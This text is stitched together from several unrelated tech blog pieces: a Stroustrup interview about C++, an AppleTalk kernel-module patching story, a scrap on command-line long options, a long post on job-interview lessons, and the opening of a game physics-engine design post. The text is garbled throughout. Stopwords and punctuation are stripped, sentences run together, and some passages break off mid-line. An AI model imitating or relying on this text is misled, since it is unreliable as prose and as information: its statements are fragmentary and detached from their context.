programming language least time scale talking decade hundred year maybe hundred year lifetime aware language reveals answer later question think c anything rust would like much simpler use towards end resist noting longevity advantage highly humorous rust people come accuse stolen idea without acknowledging thing actually almost year ago one interesting response came relatively simple question working stroustrup discus day job technical fellowmanaging director morgan stanley describes problem domain distributed system networking getting data b various find quite interesting phd ever since also get hand onto performance issue academia thought knew performance could count microsecond count nanosecond stroustrup also make suggestion large codebases make large amount code reliable maintainable bring date modern every year also teach course software design columbia university course stroustrup say one responsibility try look c standard process people excited c people turn standard meeting getting people agree anything hard also relatively easy get large crowd excited something fashionable new something like preach stability careful progress overdoing complexity lot response another question shared design goal may future model better concurrency coming almost certainly c version exists used backed people like facebook nvidia get better concurrency better use beyond looking functionalstyle pattern matching working long time proposed c maybe get thing move slowly moving really massive community get right love looking even road like see support distributed contributing got first place wanted build would first unix cluster managed finish instead getting distracted c would like see support language library actually communicating large group computer core

kernel going manually patch patch hit mainline kernel hope ubuntu pull fix kernel reason documenting binary patch realistically going take forever kernel fix get released idea possible convince ubuntu pull fix kernel released highpriority bug fix nobody us appletalk anymore want limit old kernel silly reason first step submit patch linuxnetdev mailing list get fix merged mainline kernel searched mailing list discovered first one run bug actually two separate people tried fix patch rejected minor reason obviously many people using appletalk kernel module day else people would arm broken since kernel would offer third attempt getting patch merged since two attempt made last month suspect one succeed shortly hope anyway meantime guess continue binary patching kernel module think even bigger longterm solution kernel fix classic mac user use netatalk appletalk need join force address thing netatalk dead last release broken linux least appletalk portion reason would still use maybe fork netatalk also pretty sure appletalk subsystem linux kernel full little issue work well enough people need netatalk support know broken way maybe project idea portable userspace appletalk stack gain traction going forward ever perhaps could add support netatalk fork anyway thought might interesting share troubleshooting journey eventual resolution tested connecting ubuntu server old mac iici

permutation program b foo x bar option nonoptions long option since short option cryptic limited number complex program support long option long option start two hyphen followed one alphanumeric

type technical interview dreaded whiteboard coding interview unreal coding challenge platform like hackerrank experience interview great others bad really bad wanted get really good interviewing wanted learn overcome interviewing phobia exude confidence interview like skilled surfer wanted learn ride high pressure wave came interview also looking change job time january early march applied contacted company based u europe earlystage startup like coda later stage startup like crunchbase midsize company like affirm bigger company like amazon even remote company like webflow application later landed interview comprised introductory phone interview technical phone screen interview takehome coding project coding challenge onsite interview including virtual one learn better appreciation grouped lesson three category match different phase typical recruitment process preinterview phase cover everything initial contact company point first interview happens learned application started applying company imagined application submitted higher chance getting interview would seems logical huh set target application day aiming interview every application strategy work hoped would number interview request got often fell short target almost ratio interview every application faced question need increase daily target say company something else needed change every unsuccessful application saw something needed change change came took break meeting daily number began think application differently began see application sale pitch hiring manager whoever going reading application product sold company needed fill talent gap say skill needed find way convince new task became find way effectively pitch unique skill experience personality way convinced hiring manager right fit job example one pitch came backed resume cover letter success rate one time work hiring manager still replied let know position longer available would like connect future lesson intentional application put forward quality quantity better still know unique competency experience present way match company need without sacrificing personality also important understand peculiarity company applying specific need startup smallersized company may different need bigger company thus requiring different skillset sell sure back sale pitch interview learned recruiter inmails period received number inmails recruiter mostly unsolicited open role majority role interested granted sometimes lot given busy schedule learned empathetic understanding recruiter trying job stopped seeing inmails noise inbox started making effort reply recruiter inmails even position interested succeeded building network recruiter become rich resource switch role future expect may want start replying every inmail receive might interest know interview request got recruiter replied role interested never hurt reply interview phase cover everything interview cutting across different interview type handle introductory phone call yes get busy many thing competing time hey also excellent professional mean never get phone call without knowing least two thing first name interviewer least one tangible thing company located recent news something anything noticed interview put effort make finding always came across genuinely interested company something recruiter typically look kind interview handle technical phone screen one thing almost singlehandedly decide well technical phone screen interview ability communicate thought clearly may heard stuff like interviewer care thought process yes see code importantly want know interviewer luxury seeing nonverbal cue like hand gesture nuance interviewer voice mean understanding thought process know lead conversation next question become good truth expressing thought may come naturally people others including practice practice practice practice lot mock interview mock interview friend made better confident explaining thought process interestingly helped develop new mindset interview began see interview conversation friend team member visualized interviewer end one friend sometimes gave interviewer name head would highpressure interview saw friendly chat technical problem new mindset aided many practice interview helped grow confidence much started enjoying interview sorry technical chat get started problem never start solving problem without fully understanding problem statement almost never wrong start asking clarifying question also good sign interviewer ask question rather run assumption solve problem good candidate know solve problem eg sorting problem best candidate know multiple solution problem understand tradeoff one solution versus interview performed best cruise come mind one solve algorithmic challenge also able provide alternative solution discus tradeoff aim provide multiple solution problem willing discus tradeoff able implement least one technical interview write clean code interviewer care code quality well correctness solution aim modular code separate reusable logic utility function name variable method properly bos stuck problem time stuck could caused number reason requisite knowledge incorrect assumption missing detail used think time judged fast could come solution would quiet thinking communicating interviewer thinking lot u get wrong get need alone time think sorry burst bubble alone time interviewed person yes interviewer want see come solution one thing must forget also want see collaborate teammate come solution company want rockstars also want teamplayers since interviewer friend buddy team member side mean well refer talk figuring share thought process till point got stuck confidently like cry help may uncover solution case interview coda handle coding challenge lesson apply interview take form coding challenge platform like hackerrank codility typically timed challenge say minute sometimes could lesson shared earlier useful others like asking clarifying question apply since one ask step recommend read fully understand problem write code work first even bruteforce algorithm may pas test case get working code first hopefully within first minute test code different input type help handle edge case optimize efficiency runtime space complexity repeat step till last minute good grasp computer science fundamental key added link helpful resource resource section handle takehome project take home project opportunity really shine time also mean timeconsuming one company interviewed provided hourly pay number hour worked takehome project serious serious sure really want part company investing time takehome project never compromise code quality takehome project intentional design decision naming convention code structure ready defend choice interview course hero used regex solve problem could solved using simpler string parsing algorithm turned bad decision pas interview lesson use tool comfortable lot experience approach onsite interview get good night sleep night arrive early day interview smile lot help portray confidence importantly help stay relaxed control confront fear accept even work going

great article dynamic collision detection double dispatch source collision response option linear interpolation,coincidence right cherno announced game engine series starting get going engine wait finally professional opinion make one selftaught programming hard doubt constantly wondering thing right think recently posting video huge aspect engine like physic entity system really wanted learn making ended using library instead going internals using library use fun stuff felt like defeated point making custom engine series argument made saving time first c project making goal start go major pillar engine input graphic physic entity audio wanted learn thing worked along c code design general bet people interested detail system work want learn explain code better going try make video going internals system end much simpler first glance let start physic physic engine responsible figuring object scene time object collide one another choose respond several way generic problem user configure several different level want collider want respond collision want simulate dynamic could want dynamic gravity problem call good planning robust design looked bullet went sorting engine concluded way bullet went solid boiled needed based design around already great article going hard math involved going focus design aspect instead seen anyone also real headache current moment physic engine fully featured future article plan build article cover rotation multiple contact point collision constrained simulation think work best easy get overwhelmed want ease topic way let dive different part physic engine problem split piece dynamic collision detection collision response start dynamic far simplest dynamic dynamic calculating new position object based velocity acceleration high school learn four kinematic equation along newton three law describe motion object using first third kinematic equation others useful analysis situation simulation leaf u v delta x frac give control using newton law subbing acceleration giving u v f x object need store three property velocity mass net force find first decision make towards design net force could either list single vector school make force diagram sum force implying store list would make could set force would need remove later could get annoying user think net force really total force applied single frame use vector clear end update allows user apply force adding removing automatic shortens code give performance bump summation force running total use struct store object info struct object position struct float x
